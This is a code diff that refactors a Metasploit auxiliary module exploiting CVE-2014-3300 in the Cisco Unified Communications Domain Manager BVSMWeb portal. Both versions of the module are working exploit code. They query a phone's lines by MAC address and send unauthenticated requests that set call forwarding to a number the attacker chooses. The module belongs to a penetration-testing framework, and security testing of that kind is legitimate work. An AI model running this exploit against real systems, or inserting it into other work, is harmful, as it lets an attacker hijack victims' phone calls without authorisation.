@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -12,44 +12,38 @@ class Metasploit3 < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
 
-  def initialize(info = {})
-    super(
-        'Name'        => 'Viproy CUCDM IP Phone XML Services - Call Forwarding Tool',
-        'Description' => %q{
-          The BVSMWeb portal in the web framework in Cisco Unified Communications Domain Manager (CDM)
-          in Unified CDM Application Software before 10 does not properly implement access control,
-          which allows remote attackers to modify user information. This vulnerability can be exploited
-          for unauthorised call forwarding using this module. This tool can be tested with the fake
-          voss-xmlservice component of Viproy.
-        },
-        'Author'      => 'fozavci',
-        'References'  =>
-            [
-                ['CVE', '2014-3300'],
-                ['BID', '68331'],
-                ['Viproy Fake CUCDM Service', 'https://github.com/fozavci/viproy-voipkit/raw/master/external/voss-xmlservice.rb']
-            ],
-        'License'     => MSF_LICENSE,
-        'Actions'     =>
-            [
-                [ 'Forward', {
-                    'Description' => 'Enabling the call forwarding for the MAC address.'
-                } ],
-                [ 'Info', {
-                    'Description' => 'Retrieving the call forwarding information for the MAC address.'
-                } ]
-            ],
-        'DefaultAction'  => 'Info'
-
-    )
+  def initialize(info={})
+    super(update_info(info,
+      'Name'        => 'Viproy CUCDM IP Phone XML Services - Call Forwarding Tool',
+      'Description' => %q{
+        The BVSMWeb portal in the web framework in Cisco Unified Communications Domain Manager (CDM)
+        in Unified CDM Application Software before 10 does not properly implement access control,
+        which allows remote attackers to modify user information. This vulnerability can be exploited
+        for unauthorised call forwarding using this module. This tool can be tested with the fake
+        voss-xmlservice component of Viproy.
+      },
+      'Author'      => 'fozavci',
+      'References'  =>
+        [
+          ['CVE', '2014-3300'],
+          ['BID', '68331']
+        ],
+      'License'     => MSF_LICENSE,
+      'Actions'     =>
+        [
+          [ 'Forward', { 'Description' => 'Enabling the call forwarding for the MAC address.' } ],
+          [ 'Info', { 'Description' => 'Retrieving the call forwarding information for the MAC address.' } ]
+        ],
+      'DefaultAction'  => 'Info'
+    ))
 
     register_options(
-        [
-            OptString.new('TARGETURI', [ true, 'Target URI for XML services', '/bvsmweb']),
-            OptString.new('MAC', [ true, 'MAC Address of target phone', '000000000000']),
-            OptString.new('FORWARDTO', [ true, 'Number to forward all calls', '007']),
-            OptString.new('FINTNUMBER', [ false, 'FINTNUMBER of IP Phones, required for multiple lines', '']),
-        ], self.class)
+      [
+        OptString.new('TARGETURI', [ true, 'Target URI for XML services', '/bvsmweb']),
+        OptString.new('MAC', [ true, 'MAC Address of target phone', '000000000000']),
+        OptString.new('FORWARDTO', [ true, 'Number to forward all calls', '007']),
+        OptString.new('FINTNUMBER', [ false, 'FINTNUMBER of IP Phones, required for multiple lines'])
+      ], self.class)
   end
 
   def run
@@ -57,65 +51,77 @@ class Metasploit3 < Msf::Auxiliary
     mac = Rex::Text.uri_encode(datastore["MAC"])
     forward_to = Rex::Text.uri_encode(datastore["FORWARDTO"])
 
-
-    print_status("Getting fintnumbers and display names of the IP phone")
-
-    uri_show=normalize_uri(uri+"/showcallfwd.cgi?device=SEP#{mac}")
-    vprint_status("URL: "+uri_show)
+    print_status("#{peer} - Getting fintnumbers and display names of the IP phone")
 
     res = send_request_cgi(
       {
-        'uri'    => uri_show,
+        'uri'    => normalize_uri(uri, 'showcallfwd.cgi'),
         'method' => 'GET',
+        'vars_get' => {
+          'device' => "SEP#{mac}"
+        }
       })
 
-    if res and res.code == 200 and res.body =~ /fintnumber/
-      doc = REXML::Document.new(res.body)
-      lines=[]
-      fintnumbers=[]
+    unless res && res.code == 200 && res.body && res.body.to_s =~ /fintnumber/
+      print_error("#{peer} - Target appears not vulnerable!")
+      return
+    end
 
-      list=doc.root.get_elements("MenuItem")
-      list.each {|lst|
-        xlist=lst.get_elements("Name")
-        xlist.each {|l| lines << "#{l[0]}"}
-        xlist=lst.get_elements("URL")
-        xlist.each {|l| fintnumbers << "#{l[0].to_s.split("fintnumber=")[1]}" }
-      }
-      lines.size.times{|i| print_status("Display Name: "+lines[i]+"\t"+"Fintnumber: "+fintnumbers[i])}
+    doc = REXML::Document.new(res.body)
+    lines = []
+    fint_numbers = []
 
-      # for a specific FINTNUMBER redirection
-      fintnumbers = [datastore["FINTNUMBER"]] if [datastore["FINTNUMBER"]]
+    list = doc.root.get_elements('MenuItem')
 
-      if action.name.upcase == "FORWARD"
-        fintnumbers.each {|fintnumber|
+    list.each do |lst|
+      xlist = lst.get_elements('Name')
+      xlist.each {|l| lines << "#{l[0]}"}
+      xlist = lst.get_elements('URL')
+      xlist.each {|l| fint_numbers << "#{l[0].to_s.split('fintnumber=')[1]}" }
+    end
 
-        print_status("Sending call forward request for #{fintnumber}")
+    lines.size.times do |i|
+      print_status("#{peer} - Display Name: #{lines[i]}, Fintnumber: #{fint_numbers[i]}")
+    end
 
-        uri_fwd=normalize_uri(uri+"/phonecallfwd.cgi?cfoption=CallForwardAll&device=SEP#{mac}&ProviderName=NULL&fintnumber=#{fintnumber}&telno1=#{forward_to}")
-        vprint_status("URL: "+uri_fwd)
+    # for a specific FINTNUMBER redirection
+    fint_numbers = [datastore['FINTNUMBER']] if datastore['FINTNUMBER']
+
+    if action.name.upcase == "FORWARD"
+      fint_numbers.each do |fintnumber|
+
+        print_status("#{peer} - Sending call forward request for #{fintnumber}")
+
+        send_request_cgi(
+          {
+            'uri'    => normalize_uri(uri, 'phonecallfwd.cgi'),
+            'method' => 'GET',
+            'vars_get' => {
+              'cfoption'     => 'CallForwardAll',
+              'device'       => "SEP#{mac}",
+              'ProviderName' => 'NULL',
+              'fintnumber'   => "#{fintnumber}",
+              'telno1'       => "#{forward_to}"
+            }
+          })
+
         res = send_request_cgi(
-            {
-                'uri'    => uri_fwd,
-                'method' => 'GET',
-            })
+          {
+            'uri'    => normalize_uri(uri, 'showcallfwdperline.cgi'),
+            'method' => 'GET',
+            'vars_get' => {
+              'device'     => "SEP#{mac}",
+              'fintnumber' => "#{fintnumber}"
+            }
+          })
 
-        uri_fwdpln=normalize_uri(uri+"/showcallfwdperline.cgi?device=SEP#{mac}&fintnumber=#{fintnumber}")
-        vprint_status("URL: "+uri_fwdpln)
-        res = send_request_cgi(
-            {
-                'uri'    => uri_fwdpln,
-                'method' => 'GET',
-            })
-
-        if res and res.body and res.body.to_s =~ /CFA/
-          print_good("Call forwarded successfully for #{fintnumber}")
+        if res && res.body && res.body && res.body.to_s =~ /CFA/
+          print_good("#{peer} - Call forwarded successfully for #{fintnumber}")
         else
-          print_status("Call forward failed.")
+          print_status("#{peer} - Call forward failed.")
         end
-        }
       end
-    else
-      print_error("Target appears not vulnerable!")
     end
   end
+
 end
